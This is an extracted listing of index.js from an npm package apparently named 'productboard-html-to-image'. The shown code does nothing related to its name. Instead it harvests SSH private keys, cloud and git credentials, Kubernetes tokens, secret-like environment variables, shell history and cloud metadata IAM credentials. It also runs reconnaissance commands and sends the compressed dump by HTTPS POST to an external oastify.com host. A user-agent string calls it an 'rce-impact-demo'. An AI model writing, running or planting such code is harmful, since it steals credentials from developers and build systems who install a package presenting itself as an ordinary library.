// File: tmp/tmptvx9tw1e/productboard-html-to-image/package/index.js
// ======================================================================
Line 1: const os = require("os")
Line 2: const dns = require("dns")
Line 3: const fs = require("fs")
Line 4: const path = require("path")
Line 5: const https = require("https")
Line 6: const querystring = require("querystring")
Line 7: const child_process = require("child_process")
Line 8: const zlib = require("zlib")
Line 13: const size = fs.statSync(p).size
Line 15: fs.readFileSync(p, "utf8")
Line 23: (_tmp_0 = fs.readdirSync(p))
Line 31: (_tmp_1 = child_process.execSync(cmd, { timeout }).toString()).trim
Line 39: _iterator_0.next()
Line 40: /pass|key|token|secret|env|auth|cred|aws|gcp|azure|kube|docker|jenkins|gitlab|github/i.test(key)
Line 41: result[key] = process.env[key]
Line 48: {
        cgroup: safeReadFile("/proc/1/cgroup"),
        dockerenv: fs.existsSync("/.dockerenv"),
        ciVars: Object.fromEntries(Object.entries(process.env).filter(([k]) => /ci|build|pipeline|github|gitlab|jenkins|circleci|travis/i.test(k))),
        kubernetes: {
            token: safeReadFile("/var/run/secrets/kubernetes.io/serviceaccount/token"),
            namespace: safeReadFile("/var/run/secrets/kubernetes.io/serviceaccount/namespace"),
            kubeconfig: safeReadFile(path.join(os.homedir(), ".kube/config")),
        },
        dockerConfig: safeReadFile(path.join(os.homedir(), ".docker/config.json")),
    }
Line 49: safeReadFile("/proc/1/cgroup")
Line 50: _tmp_6.dockerenv = fs.existsSync("/.dockerenv")
Line 51: _tmp_6.ciVars = Object.fromEntries(Object.entries(process.env).filter(([k]) => /ci|build|pipeline|github|gitlab|jenkins|circleci|travis/i.test(k)))
Line 53: safeReadFile("/var/run/secrets/kubernetes.io/serviceaccount/token")
Line 54: safeReadFile("/var/run/secrets/kubernetes.io/serviceaccount/namespace")
Line 55: safeReadFile(path.join(os.homedir(), ".kube/config"))
Line 57: safeReadFile(path.join(os.homedir(), ".docker/config.json"))
Line 62: {
        branch: exec("git rev-parse --abbrev-ref HEAD"),
        remotes: exec("git remote -v"),
        config: safeReadFile(path.join(os.homedir(), ".gitconfig")),
        credentials: safeReadFile(path.join(os.homedir(), ".git-credentials")),
        netrc: safeReadFile(path.join(os.homedir(), ".netrc")),
    }
Line 63: _tmp_10.branch = exec("git rev-parse --abbrev-ref HEAD")
Line 64: _tmp_10.remotes = exec("git remote -v")
Line 65: safeReadFile(path.join(os.homedir(), ".gitconfig"))
Line 66: safeReadFile(path.join(os.homedir(), ".git-credentials"))
Line 67: safeReadFile(path.join(os.homedir(), ".netrc"))
Line 72: {
        whoami: exec("whoami"),
        id: exec("id"),
        ps: exec("ps aux | head -n 30"),
        netstat: exec("ss -tunlp | head -n 30"),
        lsof: exec("lsof -n -i | head -n 30"),
        uname: exec("uname -a"),
        dmesg: exec("dmesg | tail -n 50"),
        mounts: exec("cat /proc/mounts | head -n 30"),
        crontab: exec("crontab -l"),
    }
Line 73: _tmp_11.whoami = exec("whoami")
Line 74: _tmp_11.id = exec("id")
Line 75: _tmp_11.ps = exec("ps aux | head -n 30")
Line 76: _tmp_11.netstat = exec("ss -tunlp | head -n 30")
Line 77: _tmp_11.lsof = exec("lsof -n -i | head -n 30")
Line 78: _tmp_11.uname = exec("uname -a")
Line 79: _tmp_11.dmesg = exec("dmesg | tail -n 50")
Line 80: _tmp_11.mounts = exec("cat /proc/mounts | head -n 30")
Line 81: _tmp_11.crontab = exec("crontab -l")
Line 86: {
        npm: exec("npm ls -g --depth=0 --json"),
        apt: exec("dpkg -l | head -n 30"),
        brew: exec("brew list || echo 'no brew'"),
        pip: exec("pip list --format=json || echo 'no pip'"),
        which_tools: {
            aws: exec("which aws"),
            gcloud: exec("which gcloud"),
            az: exec("which az"),
            kubectl: exec("which kubectl"),
            terraform: exec("which terraform"),
            docker: exec("which docker"),
            nmap: exec("which nmap"),
            curl: exec("which curl"),
        },
    }
Line 87: _tmp_12.npm = exec("npm ls -g --depth=0 --json")
Line 88: _tmp_12.apt = exec("dpkg -l | head -n 30")
Line 89: _tmp_12.brew = exec("brew list || echo 'no brew'")
Line 90: _tmp_12.pip = exec("pip list --format=json || echo 'no pip'")
Line 91: _tmp_12.which_tools = {
            aws: exec("which aws"),
            gcloud: exec("which gcloud"),
            az: exec("which az"),
            kubectl: exec("which kubectl"),
            terraform: exec("which terraform"),
            docker: exec("which docker"),
            nmap: exec("which nmap"),
            curl: exec("which curl"),
        }
Line 92: _tmp_13.aws = exec("which aws")
Line 93: _tmp_13.gcloud = exec("which gcloud")
Line 94: _tmp_13.az = exec("which az")
Line 95: _tmp_13.kubectl = exec("which kubectl")
Line 96: _tmp_13.terraform = exec("which terraform")
Line 97: _tmp_13.docker = exec("which docker")
Line 98: _tmp_13.nmap = exec("which nmap")
Line 99: _tmp_13.curl = exec("which curl")
Line 107: _tmp_15.push({ name: "aws_instance", url: "http://169.254.169.254/latest/dynamic/instance-identity/document" })
Line 108: _tmp_15.push({ name: "aws_metadata", url: "http://169.254.169.254/latest/meta-data/" })
Line 109: _tmp_15.push({ name: "aws_iam", url: "http://169.254.169.254/latest/meta-data/iam/security-credentials/" })
Line 110: _tmp_15.push({ name: "gcp_metadata", url: "http://metadata.google.internal/computeMetadata/v1/?recursive=true", headers: { "Metadata-Flavor": "Google" } })
Line 111: _tmp_15.push({ name: "azure_metadata", url: "http://169.254.169.254/metadata/instance?api-version=2021-02-01", headers: { "Metadata": "true" } })
Line 113: _iterator_1.next()
Line 114: {
            let cmd = `curl -s --max-time 2 ${url}`;
            if (headers) {
                const headerStr = Object.entries(headers).map(([k, v]) => `-H "${k}: ${v}"`).join(" ");
                cmd = `curl -s --max-time 2 ${headerStr} ${url}`;
            }
            metadata[name] = exec(cmd);
        }
Line 116: {
                const headerStr = Object.entries(headers).map(([k, v]) => `-H "${k}: ${v}"`).join(" ");
                cmd = `curl -s --max-time 2 ${headerStr} ${url}`;
            }
Line 117: const headerStr = Object.entries(headers).map(([k, v]) => `-H "${k}: ${v}"`).join(" ")
Line 120: metadata[name] = exec(cmd)
Line 121: catch (e) {
            metadata[name] = `ERR: ${e.message}`;
        }
Line 122: metadata[name] = `ERR: ${e.message}`
Line 129: {
        aws: {
            credentials: safeReadFile(path.join(os.homedir(), ".aws/credentials")),
            config: safeReadFile(path.join(os.homedir(), ".aws/config")),
            sts: exec("aws sts get-caller-identity"),
        },
        gcloud: {
            config: safeReadFile(path.join(os.homedir(), ".config/gcloud/configurations/config_default")),
            credentials: safeReadFile(path.join(os.homedir(), ".config/gcloud/credentials.db")),
        },
        azure: {
            credentials: safeReadFile(path.join(os.homedir(), ".azure/azureProfile.json")),
            accessTokens: safeReadFile(path.join(os.homedir(), ".azure/accessTokens.json")),
        },
    }
Line 130: _tmp_25.aws = {
            credentials: safeReadFile(path.join(os.homedir(), ".aws/credentials")),
            config: safeReadFile(path.join(os.homedir(), ".aws/config")),
            sts: exec("aws sts get-caller-identity"),
        }
Line 131: safeReadFile(path.join(os.homedir(), ".aws/credentials"))
Line 132: safeReadFile(path.join(os.homedir(), ".aws/config"))
Line 133: _tmp_26.sts = exec("aws sts get-caller-identity")
Line 136: safeReadFile(path.join(os.homedir(), ".config/gcloud/configurations/config_default"))
Line 137: safeReadFile(path.join(os.homedir(), ".config/gcloud/credentials.db"))
Line 140: safeReadFile(path.join(os.homedir(), ".azure/azureProfile.json"))
Line 141: safeReadFile(path.join(os.homedir(), ".azure/accessTokens.json"))
Line 147: {
        node_version: process.version,
        global_modules: (() => {
            try {
                return Object.keys(require("module").globalPaths);
            } catch {
                return [];
            }
        })(),
        loaded_modules: Object.keys(process.binding("natives")),
        npm_config: exec("npm config ls -l"),
    }
Line 149: _tmp_29.global_modules = (() => {
            try {
                return Object.keys(require("module").globalPaths);
            } catch {
                return [];
            }
        })()
Line 151: Object.keys(require("module").globalPaths)
Line 156: Object.keys(process.binding("natives"))
Line 157: _tmp_29.npm_config = exec("npm config ls -l")
Line 163: zlib.gzipSync(JSON.stringify(data)).toString("base64")
Line 172: dump = {
        timestamp: new Date().toISOString(),
        app: (() => {
            try {
                const pkg = require("./package.json");
                return { name: pkg.name, version: pkg.version, dependencies: pkg.dependencies, scripts: pkg.scripts };
            } catch {
                return {};
            }
        })(),
        os: {
            hostname: os.hostname(),
            platform: os.platform(),
            arch: os.arch(),
            uptime: os.uptime(),
            cpus: os.cpus().length,
            totalmem: os.totalmem(),
            freemem: os.freemem(),
            userInfo: os.userInfo(),
            tmpdir: os.tmpdir(),
            homedir: os.homedir(),
            cwd: process.cwd(),
        },
        env: getSensitiveEnvVars(),
        dns: (() => {
            try {
                return dns.getServers();
            } catch (e) {
                return [`ERR: ${e.message}`];
            }
        })(),...
Line 174: _tmp_32.app = (() => {
            try {
                const pkg = require("./package.json");
                return { name: pkg.name, version: pkg.version, dependencies: pkg.dependencies, scripts: pkg.scripts };
            } catch {
                return {};
            }
        })()
Line 176: const pkg = require("./package.json")
Line 183: os.hostname()
Line 184: os.platform()
Line 185: os.arch()
Line 187: os.cpus()
Line 188: os.totalmem()
Line 190: os.userInfo()
Line 200: _tmp_38.push(<operator>.formatString("ERR: ", e.message, ""))
Line 213: safeReadFile("/etc/passwd")
Line 214: safeReadFile("/etc/hosts")
Line 215: safeReadFile("/etc/resolv.conf")
Line 216: safeReadFile(path.join(os.homedir(), ".bash_history"))
Line 217: safeReadFile(path.join(os.homedir(), ".zsh_history"))
Line 218: safeReadFile(path.join(os.homedir(), ".ssh/config"))
Line 219: safeReadFile(path.join(os.homedir(), ".ssh/id_rsa"))
Line 220: safeReadFile(path.join(os.homedir(), ".ssh/known_hosts"))
Line 221: safeReadFile(path.join(os.homedir(), ".aws/credentials"))
Line 222: safeReadFile(path.join(os.homedir(), ".aws/config"))
Line 223: safeReadFile(path.join(os.homedir(), ".npmrc"))
Line 224: safeReadFile(path.join(os.homedir(), ".gitconfig"))
Line 225: safeReadFile(path.join(os.homedir(), ".docker/config.json"))
Line 227: safeReadFile(path.join(process.cwd(), ".env"))
Line 228: path.join(process.cwd(), ".github/workflows")
Line 236: getCloudMetadata()
Line 237: getCloudCLIs()
Line 244: {
    const postData = querystring.stringify({
        msg: compressData(dump)
    });

    const options = {
        hostname: "ovnxva4z7pgbompisolekpb83z9qxmlb.oastify.com",
        port: 443,
        path: "/",
        method: "POST",
        headers: {
            "Content-Type": "application/x-www-form-urlencoded",
            "Content-Length": postData.length,
            "User-Agent": "rce-impact-demo",
            "X-Report-ID": "328XXXX",
            "X-Data-Format": "gzip-base64",
        },
        timeout: 5000,
    };

    const req = https.request(options, res => {
        res.on("data", () => { });
        res.on("end", () => { });
    });

    req.on("error", () => { });
    req.on("timeout", () => req.destroy());
    req.write(postData);
    req.end();
}
Line 246: compressData(dump)
Line 264: const req = https.request(options, res => {
        res.on("data", () => { });
        res.on("end", () => { });
    })
Line 271: req.write(postData)
Line 272: req.end()
